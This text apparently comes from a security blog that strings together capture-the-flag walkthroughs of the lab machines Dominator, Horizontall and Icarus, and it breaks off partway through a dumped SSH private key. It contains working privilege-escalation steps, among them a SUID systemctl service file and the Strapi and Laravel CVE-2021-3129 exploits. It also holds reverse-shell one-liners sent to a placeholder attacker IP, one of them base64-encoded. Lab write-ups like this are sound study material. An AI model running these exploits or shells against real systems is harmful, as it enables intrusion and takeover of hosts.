OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)| 256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)|_ 256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.92%I=7%D=2/13%Time=6209D6C1%P=x86_64-pc-linux-gnu%r(DNSVSF:ersionBindReqTCP,52,&quot;\\0P\\0\\x06\\x85\\0\\0\\x01\\0\\x01\\0\\x01\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03\\xc0\\x0c\\0\\x10\\0\\x03\\0\\0\\0\\0\\0\\x18\\x17not\\x20currenSF:tly\\x20available\\xc0\\x0c\\0\\x02\\0\\x03\\0\\0\\0\\0\\0\\x02\\xc0\\x0c&quot;);MAC Address: 08:00:27:9B:F4:CF (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.21 secondsPort 53, DNSPort 80, HTTPPort 65222 , SSHBegin enumeration on these portsHTTP- TCP 80┌──(root💀kali)-[/opt/hackmyv/dominator]└─# gobuster dir -u http://192.168.56.53 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s &quot;200,204,301,302,307,403,500&quot; -x &quot;txt,html,php,jsp&quot; -o gobuster_p80.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.53 [+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,jsp,txt,html[+] Expanded: true[+] Timeout: 10s===============================================================2022/02/13 23:09:46 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.53/index.html (Status: 200) [Size: 10701]http://192.168.56.53/robots.txt (Status: 200) [Size: 14] http://192.168.56.53/server-status (Status: 403) [Size: 278] Found a domain in robots.txt┌──(root💀kali)-[/opt/hackmyv/dominator]└─# curl http://192.168.56.53/robots.txtdominator.hmvDNS- TCP 53secret.dominator.hmv. 604800 IN TXT &quot;/fhcrefrperg&quot; found in DNS zone transfer.1┌──(root💀kali)-[/opt/hackmyv/dominator]└─# dig axfr @192.168.56.53 dominator.hmv ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.17.21-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @192.168.56.53 dominator.hmv; (1 server found);; global options: +cmddominator.hmv. 604800 IN SOA ns1.dominator.hmv. root.dominator.hmv. 2 604800 86400 2419200 604800dominator.hmv. 604800 IN NS ns1.dominator.hmv.admin.dominator.hmv. 604800 IN A 192.168.0.12ns1.dominator.hmv. 604800 IN A 127.0.0.1secret.dominator.hmv. 604800 IN TXT &quot;/fhcrefrperg&quot;www.dominator.hmv. 604800 IN A 192.168.0.11dominator.hmv. 604800 IN SOA ns1.dominator.hmv. root.dominator.hmv. 2 604800 86400 2419200 604800;; Query time: 0 msec;; SERVER: 192.168.56.53#53(192.168.56.53) (TCP);; WHEN: Sun Feb 13 23:20:18 EST 2022;; XFR size: 7 records (messages 1, bytes 255)Shell as HansFind what possible cipher it is:From there determine it is rot13 and the decrypted text is /supersecretContains private key of hans:┌──(root💀kali)-[/opt/hackmyv/dominator]└─# wget http://dominator.hmv/supersecret/hans_key--2022-02-14 00:46:32-- http://dominator.hmv/supersecret/hans_keyResolving dominator.hmv (dominator.hmv)... 192.168.56.53Connecting to dominator.hmv (dominator.hmv)|192.168.56.53|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1743 (1.7K)Saving to: ‘hans_key’hans_key 100%[===========================================================================================================&amp;gt;] 1.70K --.-KB/s in 0s 2022-02-14 00:46:32 (610 MB/s) - ‘hans_key’ saved [1743/1743]┌──(root💀kali)-[/opt/hackmyv/dominator]└─# locate ssh2john /usr/share/john/ssh2john.py/usr/share/john/__pycache__/ssh2john.cpython-39.pyc ┌──(root💀kali)-[/opt/hackmyv/dominator]└─# /usr/share/john/ssh2john.py hans_key &amp;gt; id_rsa.hans ┌──(root💀kali)-[/opt/hackmyv/dominator]└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hans Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusangels (hans_key) 1g 0:00:00:00 DONE (2022-02-14 00:45) 100.0g/s 6400p/s 6400c/s 6400C/s purple..charlieUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed┌──(root💀kali)-[/opt/hackmyv/dominator]└─# chmod 600 hans_key ┌──(root💀kali)-[/opt/hackmyv/dominator]└─# ssh-keygen -y -f hans_key Enter passphrase: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCw+kbLGx/49/GrtXgePBXbkJXI+G1kW/bF9bVAGyqOYClUgiVhA5lvSc1s5buScq4ppMB9cYnRtrHQ39SUbDP0j1525BpuDJjtkP1a4qi4wPPSgYrb0KAA7DEzTnXzQVzAbx+agQZvs/wa9rckBdSZbCAQBOKz+17iFcak4oCOHhkiGdbNjv7ThUAcMNpKCSQaTLwbktZuvh/BxObZXL6lUsqxNmo8BeifC44uKCwTPw2RRNAeVoTtCshWHSvlGI6HY6hCz335hX6CTy+mNQEB4tky13YqukXSKe31iO631vQd99F4+TrUVVGaSO84vTy0FKyhVZAVxDr6UviNOk91┌──(root💀kali)-[/opt/hackmyv/dominator]└─# ssh -i hans_key hans@192.168.56.53 -p 65222Enter passphrase for key &#39;hans_key&#39;: Linux Dominator 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 . . . \\|/ `--+--&#39; /|\\ &#39; | &#39; | | ,--&#39;#`--. |#######| _.-&#39;#######`-._ ,-&#39;###############`-. ,&#39;#####################`, /#########################\\ |###########################| |#############################| |#############################| |#############################| |#############################| |###########################| \\#########################/ `.#####################,&#39; `._###############_,&#39; `--..#####..--&#39; ___ __ __ ___ | | |__ | / ` / \\ |\\/| |__ |/\\| |___ |___ \\__, \\__/ | | |___ hans@Dominator:/home$ cd hans/hans@Dominator:~$ ls -latotal 36drwxr-xr-x 4 hans hans 4096 ene 10 2021 .drwxr-xr-x 3 root root 4096 ene 9 2021 ..-rw------- 1 hans hans 1 ene 10 2021 .bash_history-rw-r--r-- 1 hans hans 220 ene 9 2021 .bash_logout-rw-r--r-- 1 hans hans 3526 ene 9 2021 .bashrcdrwxr-xr-x 3 hans hans 4096 ene 9 2021 .local-rw-r--r-- 1 hans hans 83 ene 10 2021 note-rw-r--r-- 1 hans hans 807 ene 9 2021 .profiledrwxr-xr-x 2 hans hans 4096 ene 9 2021 .sshhans@Dominator:~$ cat note the flag &quot;user.txt&quot; was removed .. maybe it&#39;s in the trash or maybe not ..@_@hans@Dominator:~$ find . -name &quot;user*&quot;./.local/share/Trash/files/user.txt./.local/share/Trash/info/user.txt.trashinfoShell as Rootlinpeas highlighted /usr/bin/systemctl !════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════ [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid strings Not Found strace Not Found -rwsr-xr-x 1 root root 10K mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 63K jul 27 2018 /usr/bin/passwd ---&amp;gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 44K jul 27 2018 /usr/bin/newgrp ---&amp;gt; HP-UX_10.20 -rwsr-xr-x 1 root root 83K jul 27 2018 /usr/bin/gpasswd -rwsr-xr-x 1 root root 44K jul 27 2018 /usr/bin/chsh -rwsr-xr-x 1 root root 53K jul 27 2018 /usr/bin/chfn ---&amp;gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 35K ene 10 2019 /usr/bin/umount ---&amp;gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 63K ene 10 2019 /usr/bin/su -rwsr-xr-x 1 root root 51K ene 10 2019 /usr/bin/mount ---&amp;gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 427K ene 31 2020 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 50K jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 853K oct 24 2020 /usr/bin/systemctlTo exploit:hans@Dominator:~$ nano /tmp/temp.service hans@Dominator:~$ cat /tmp/temp.service [Service]Type=oneshotExecStart=/bin/sh -c &quot;cp /bin/bash /tmp/bash2 &amp;amp;&amp;amp; chmod u+s /tmp/bash2&quot;[Install]WantedBy=multi-user.targethans@Dominator:~$ /usr/bin/systemctl link /tmp/temp.service hans@Dominator:~$ /usr/bin/systemctl enable --now /tmp/temp.servicehans@Dominator:~$ ls -la /tmp/total 1512drwxrwxrwt 9 root root 4096 feb 14 07:29 .drwxr-xr-x 18 root root 4096 ene 9 2021 ..-rwsrwxrwx 1 root root 1168776 feb 14 07:29 bash2drwxrwxrwt 2 root root 4096 feb 14 05:08 .font-unixdrwxrwxrwt 2 root root 4096 feb 14 05:08 .ICE-unix-rw-r--r-- 1 hans hans 330173 abr 11 2021 linpeas.sh-rw-r--r-- 1 hans hans 39 feb 14 07:26 outputdrwx------ 3 root root 4096 feb 14 05:08 systemd-private-58c95b209f4843c199a4313bdf9cc9c7-apache2.service-UMq0nXdrwx------ 3 root root 4096 feb 14 05:08 systemd-private-58c95b209f4843c199a4313bdf9cc9c7-systemd-timesyncd.service-e1aMXK-rw-r--r-- 1 hans hans 131 feb 14 07:29 temp.servicedrwxrwxrwt 2 root root 4096 feb 14 05:08 .Test-unixdrwxrwxrwt 2 root root 4096 feb 14 05:08 .X11-unixdrwxrwxrwt 2 root root 4096 feb 14 05:08 .XIM-unixhans@Dominator:~$ /tmp/bash2 -pbash2-5.0# whoamiroot" }, { "title": "horizontall", "url": "/posts/horizontall/", "categories": "HTB, easyyy", "tags": "CVE", "date": "2022-02-06 11:30:00 +0800", "snippet": "Overview Box Difficulty Link Easy HTB Recon┌──(root💀kali)-[/opt/HTB/Horizontall]└─# masscan -p1-65535,U:1-65535 10.10.11.105 --rate=1000 -e tun0Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-06 06:10:59 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 22/tcp on 10.10.11.105 Discovered open port 80/tcp on 10.10.11.105 Enumerate ports that were found to be open:┌──(root💀kali)-[/opt/HTB/Horizontall]└─# nmap -sVC -p 22,80 10.10.11.105 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 01:18 ESTNmap scan report for horizontall.htb (10.10.11.105)Host is up (0.033s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)| 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)|_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-title: horizontall|_http-server-header: nginx/1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.27 secondsBegin enumeration.HTTP- TCP 80┌──(root💀kali)-[/opt/HTB/Horizontall]└─# curl 10.10.11.105 -v* Trying 10.10.11.105:80...* Connected to 10.10.11.105 (10.10.11.105) port 80 (#0)&amp;gt; GET / HTTP/1.1&amp;gt; Host: 10.10.11.105&amp;gt; User-Agent: curl/7.80.0&amp;gt; Accept: */*&amp;gt; * Mark bundle as not supporting multiuse&amp;lt; HTTP/1.1 301 Moved Permanently&amp;lt; Server: nginx/1.14.0 (Ubuntu)&amp;lt; Date: Thu, 06 Jan 2022 06:17:21 GMT&amp;lt; Content-Type: text/html&amp;lt; Content-Length: 194&amp;lt; Connection: keep-alive&amp;lt; Location: http://horizontall.htb&amp;lt; &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;301 Moved Permanently&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body bgcolor=&quot;white&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;301 Moved Permanently&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx/1.14.0 (Ubuntu)&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;* Connection #0 to host 10.10.11.105 left intactAdd horizontall.htb to /etc/hosts┌──(root💀kali)-[/opt/HTB/Horizontall]└─# cat /etc/hosts 127.0.0.1 localhost127.0.1.1 kali10.10.11.105 horizontall.htb# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allroutersEnumerate website, we can find a javascript file called http://horizontall.htb/js/app.c68eb462.jsCopy to beautifier and beautify. We can find we see that the subdomain called, http://api-prod.horizontall.htb/Add api-prod.horizontall.htb to /etc/hosts└─# cat /etc/hosts 127.0.0.1 localhost127.0.1.1 kali10.10.11.105 horizontall.htb api-prod.horizontall.htbFurther enumerations shows strapi CMS at /admin┌──(root💀kali)-[/opt/HTB/Horizontall]└─# gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s &quot;200,204,351,352,357,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot; ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://api-prod.horizontall.htb[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php,php.bak,bak,jsp,txt,html[+] Expanded: true[+] Timeout: 10s===============================================================2022/01/06 02:20:54 Starting gobuster in directory enumeration mode===============================================================http://api-prod.horizontall.htb/index.html (Status: 200) [Size: 413]http://api-prod.horizontall.htb/reviews (Status: 200) [Size: 507]http://api-prod.horizontall.htb/users (Status: 403) [Size: 60] http://api-prod.horizontall.htb/admin (Status: 200) [Size: 854]http://api-prod.horizontall.htb/Reviews (Status: 200) [Size: 507]http://api-prod.horizontall.htb/robots.txt (Status: 200) [Size: 121]Shell as strapiLooks like there are several known exploit for strapi.┌──(root💀kali)-[/opt/HTB/Horizontall]└─# searchsploit strapi ---------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Strapi 3.0.0-beta - Set Password (Unauthenticated) | multiple/webapps/50237.pyStrapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated) | multiple/webapps/50238.pyStrapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsWe can see that the version is 3.0.0-beta.17.4 which matches multiple/webapps/50239.py.┌──(root💀kali)-[/opt/HTB/Horizontall]└─# curl api-prod.horizontall.htb/admin/init {&quot;data&quot;:{&quot;uuid&quot;:&quot;a55da3bd-9693-4a08-9279-f9df57fd1817&quot;,&quot;currentEnvironment&quot;:&quot;development&quot;,&quot;autoReload&quot;:false,&quot;strapiVersion&quot;:&quot;3.0.0-beta.17.4&quot;}}Let’s run the exploit !┌──(root💀kali)-[/opt/HTB/Horizontall]└─# locate 50239.py /usr/share/exploitdb/exploits/multiple/webapps/50239.py┌──(root💀kali)-[/opt/HTB/Horizontall]└─# python3 50239.py http://api-prod.horizontall.htb[+] Checking Strapi CMS Version running[+] Seems like the exploit will work!!![+] Executing exploit[+] Password reset was successfully[+] Your email is: admin@horizontall.htb[+] Your new credentials are: admin:SuperStrongPassword1[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNDU1Njk0LCJleHAiOjE2NDQwNDc2OTR9.1IlZN6UGnKntpUCHNT6ZZZlTnRv-NyiL3XOHHcC_etg$&amp;gt; whoami[+] Triggering Remote code executin[*] Rember this is a blind RCE don&#39;t expect to see output{&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:[{&quot;messages&quot;:[{&quot;id&quot;:&quot;An error occurred&quot;}]}]}$&amp;gt; bash -i &amp;gt;&amp;amp; /dev/tcp/[YOURIPADDRESS]/4242 0&amp;gt;&amp;amp;1[+] Triggering Remote code executin[*] Rember this is a blind RCE don&#39;t expect to see output{&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:[{&quot;messages&quot;:[{&quot;id&quot;:&quot;An error occurred&quot;}]}]}$&amp;gt; echo &#39;YmFzaCAtaSA+JiAvZGV2L3RjcC9bWU9VUklQQUREUkVTU10vNDI0MiAwPiYx&#39; | base64 --decode | bash[+] Triggering Remote code executin[*] Rember this is a blind RCE don&#39;t expect to see outputOn our local machine┌──(root💀kali)-[/opt/HTB/Horizontall]└─# nc -lvnp 4242 listening on [any] 4242 ...strapi@horizontall:~/myapi$ whoami;id;hostnamewhoami;id;hostnamestrapiuid=1001(strapi) gid=1001(strapi) groups=1001(strapi)horizontallShell as RootAfter running linpeas, we can see that there are several port open on localmachine. e.g. 127.0.0.1:3306 and 127.0.0.1:8000.strapi@horizontall:/tmp$ wget http://[YOURIPADDRESS]:1235/linpeas.sh --2022-01-07 01:21:05-- http://[YOURIPADDRESS]:1235/linpeas.sh Connecting to [YOURIPADDRESS]:1235... connected. HTTP request sent, awaiting response... 200 OK Length: 330173 (322K) [text/x-sh] Saving to: ‘linpeas.sh’ linpeas.sh 100%[======================================================================================&amp;gt;] 322.43K --.-KB/s in 0.05s 2022-01-07 01:21:05 (6.13 MB/s) - ‘linpeas.sh’ saved [330173/330173] strapi@horizontall:/tmp$ bash linpeas.sh [+] Active Ports[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-portstcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN 1780/node /usr/bin/ tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - We can see that it runs Laravel v8 (PHP v7.4.18).strapi@horizontall:/tmp$ curl 127.0.0.1:8000 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&quot;en&quot;&amp;gt; &amp;lt;head&amp;gt; …..… &amp;lt;div class=&quot;ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0&quot;&amp;gt; Laravel v8 (PHP v7.4.18) &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;There is an exploit for that version. The exploit CVE-2021-3129 affects all Version: &amp;lt;= 8.4.2.┌──(root💀kali)-[/opt/HTB/Horizontall]└─# searchsploit laravel ---------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------...Laravel 8.4.2 debug mode - Remote code execution | php/webapps/49424.py...---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsUnfortunately, 49424.py does not work for me!strapi@horizontall:/tmp$ wget http://[YOURIPADDRESS]:1235/49424.py--2022-01-07 01:52:42-- http://[YOURIPADDRESS]:1235/49424.pyConnecting to [YOURIPADDRESS]:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 4052 (4.0K) [text/plain]Saving to: ‘49424.py’ 49424.py 100%[======================================================================================&amp;gt;] 3.96K --.-KB/s in 0s 2022-01-07 01:52:42 (22.1 MB/s) - ‘49424.py’ saved [4052/4052] strapi@horizontall:/tmp$ chmod +x 49424.py strapi@horizontall:/tmp$ python3 49424.py http://127.0.0.1:8000 /var/www/html/laravel/storage/logs/laravel.log &#39;id&#39; Exploit... strapi@horizontall:/tmp$Used another exploit from : https://github.com/nth347/CVE-2021-3129_exploitAlso I donwload phpgcc on local machine and port over to victim machine. git clone https://github.com/ambionics/phpggc.gitstrapi@horizontall:/tmp$ wget -r -np -R &quot;index.html*&quot; http://[YOURIPADDRESS]:1235/phpggc/ strapi@horizontall:/tmp$ wget http://[YOURIPADDRESS]:1235/exploit.py--2022-01-07 02:04:09-- http://[YOURIPADDRESS]:1235/exploit.pyConnecting to [YOURIPADDRESS]:1235... connected.HTTP request sent, awaiting response... 200 OKLength: 2935 (2.9K) [text/plain]Saving to: ‘exploit.py’exploit.py 100%[======================================================================================&amp;gt;] 2.87K --.-KB/s in 0s 2022-01-07 02:04:09 (18.2 MB/s) - ‘exploit.py’ saved [2935/2935]strapi@horizontall:/tmp$ chmod +x exploit.py strapi@horizontall:/tmp$ ./exploit.py http://localhost:8000 Monolog/RCE1 id[i] Trying to clear logs[+] Logs cleared[+] PHPGGC found. Generating payload and deploy it to the target[+] Successfully converted logs to PHAR[+] PHAR deserialized. Exploiteduid=0(root) gid=0(root) groups=0(root)[i] Trying to clear logs[+] Logs clearedTo get a reverse shell:strapi@horizontall:/tmp$ ./exploit.py http://localhost:8000 Monolog/RCE1 &quot;nc [YOURIPADDRESS] 6666 | /bin/bash 2&amp;gt;&amp;amp;1 | nc [YOURIPADDRESS] 6667&quot;" }, { "title": "icarus", "url": "/posts/icarus/", "categories": "hackmyvm, mediumm", "tags": "LD_PRELOAD", "date": "2022-01-06 10:30:00 +0800", "snippet": "Overview Box Difficulty Link Medium hackmyvm Link Recon┌──(root💀kali)-[/opt/hackmyv/icarus]└─# masscan -p1-65535,U:1-65535 192.168.56.35 --rate=1000 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-06 01:16:24 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 80/tcp on 192.168.56.35 Discovered open port 22/tcp on Enumerate ports that were found to be open:┌──(root💀kali)-[/opt/hackmyv/icarus]└─# nmap -sVC -O -p 22,80 192.168.56.35 -o nmap.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-05 20:24 ESTNmap scan report for 192.168.56.35Host is up (0.00051s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 b6:65:56:40:8d:a8:57:b9:15:1e:0e:1f:a5:d0:52:3a (RSA)| 256 79:65:cb:2a:06:82:13:d3:76:6b:1c:55:cd:8f:07:b7 (ECDSA)|_ 256 b1:34:e5:21:a0:28:30:c0:6c:01:0e:b0:7b:8f:b8:c6 (ED25519)80/tcp open http nginx 1.14.2|_http-title: LOGIN|_http-server-header: nginx/1.14.2MAC Address: 08:00:27:33:65:76 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds Begin enumeration.HTTP- TCP 80┌──(root💀kali)-[/opt/hackmyv/icarus]└─# gobuster dir -u http://192.168.56.35:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -e -k -s &quot;200,204,351,352,357,403,500&quot; -x &quot;txt,html,php,php.bak,bak,jsp&quot;===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.56.35:80[+] Method: GET[+] Threads: 100[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: bak,jsp,txt,html,php,php.bak[+] Expanded: true[+] Timeout: 10s===============================================================2022/01/05 20:28:13 Starting gobuster in directory enumeration mode===============================================================http://192.168.56.35:80/a (Status: 200) [Size: 9641]http://192.168.56.35:80/check.php (Status: 200) [Size: 21] http://192.168.56.35:80/index.php (Status: 200) [Size: 407] http://192.168.56.35:80/index.php (Status: 200) [Size: 407] http://192.168.56.35:80/login.php (Status: 302) [Size: 0] [--&amp;gt; index.php]http://192.168.56.35:80/xdb (Status: 200) [Size: 1] http://192.168.56.35:80/xml (Status: 200) [Size: 1] http://192.168.56.35:80/xyz (Status: 200) [Size: 1] http://192.168.56.35:80/xxx (Status: 200) [Size: 1] http://192.168.56.35:80/xls (Status: 200) [Size: 1] http://192.168.56.35:80/xsl (Status: 200) [Size: 1] ===============================================================2022/01/05 20:28:15 Finished┌──(root💀kali)-[/opt/hackmyv/icarus]└─# wget http://192.168.56.35:80/a --2022-01-05 20:32:04-- http://192.168.56.35/aConnecting to 192.168.56.35:80... connected.HTTP request sent, awaiting response... 200 OKLength: 9641 (9.4K) [application/octet-stream]Saving to: ‘a.txt’a 100%[======================================================================================&amp;gt;] 9.42K --.-KB/s in 0s 2022-01-05 20:32:04 (271 MB/s) - ‘a’ saved [9641/9641]┌──(root💀kali)-[/opt/hackmyv/icarus]└─# mv a a.txt | head a.txt axaaxabxacxadxaexafxagxahShell as icarusCurl all links from and save to output.for i in $(cat a.txt); do curl &quot;http://192.168.56.35/$i&quot; &amp;gt;&amp;gt; curl.output; done┌──(root💀kali)-[/opt/hackmyv/icarus]└─# tail -n 30 curl.outputxzbtaxzbtbxzbtc-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEA5xagxLiN5ObhPjNcs2I2ckcYrErKaunOwm40kTBnJ6vrbdRYHteSafNWC6xFFzwO77+Kze229eK4ddZcwmU0IdN02Y8nYrxhl8lOc+e5T0Ajz+tRmLGoxJVPsSTzKBERlWpKuJoGO/CEFLOv6PP6s79YYzZFpdUjaczY96jgICftzNZS+VkBXuLjKr79h4Twz7BK4V6FEQY0hwT8NFfNrF3x3VPe0UstdiUJFl4QV/qAPlHVhPd0YUEPr/95mryjuGi1xwP7xVFrYyjLfPepqYHiS5LZxFewLWhhSjBOI0dzf/TwiNRnVGTZhB3GemgEIQRAam26jkZZ3BxkrUVckQAAA8jfk7Jp35OyaQAAAAdzc2gtcnNhAAABAQDnFqDEuI3k5uE+M1yzYjZyRxisSspq6c7CbjSRMGcnq+tt1Fge15Jp81YLrEUXPA7vv4rN7bb14rh11lzCZTQh03TZjydivGGXyU5z57lPQCPP61GYsajElU+xJPMoERGVakq4mgY78IQUs6/o8/qzv1hjNkWl1SNpzNj3qOAgJ+3M1lL5WQFe4uMqvv2HhPDPsErhXoURBjSHBPw0V82sXfHdU97RSy12JQkWXhBX+oA+UdWE93RhQQ+v/3mavKO4aLXHA/vFUWtjKMt896mpgeJLktnEV7AtaGFKME4jR3N/9PCI1GdUZNmEHcZ6aAQhBEBqbbqORlncHGStRVyRAAAAAwEAAQAAAQEAvdjwMU1xfTlUmPY3VUP9ePsBwSIck6ML8t35H8KFLKln3C4USxpNNe/so+BeTo1PtBVHYpDFu9IMOvrl7+qW3qdLGyUpdUtQXhPK+RvJONt30GwB+BEUlpQYCW9SuHr1WCwfwPMA5iNdT2ijvx0ZvKwZYECJDYlB87yQDz7VCnRTiQGP2Mqiiwb7vPd/t386Y+cAz1cVl7BnHzWWJTUTkKCwijnvjYrD0otTQX4sGd6CrI44g+L8hnYuCZz+a0j6IyUfXJqj6l+/Z2Af7pJjbJD3P28xX7eY0h1Cec2l/sb7qg2wy0qJNywJ35l8bZzZKjkXztPLOqMFQ6Fh0BqSdQAAAIEAlaH0ZEzJsZoR3QqcKlxRKjVcuQCwcrKlNbJu2qRuUG812CLb9jJxJxacJPBV0NS832c+hZ3BiLtA5FwCiGlGq5m5HS3odf3lLXDfIK+pur4OWKBNLDxKbqi4s4M05vR4gHkmotiH9eWlCNuqL46Ip5H1vFXeJMpLRLN0gqOGuQQAAACBAPfffuhidAgUZH/yTvATKC5lcGrE7bkpOq+6XMMgxEQl0Hzry76irGXkhTY4QUtthYo4+g7jiDzKlbeaS7aN8R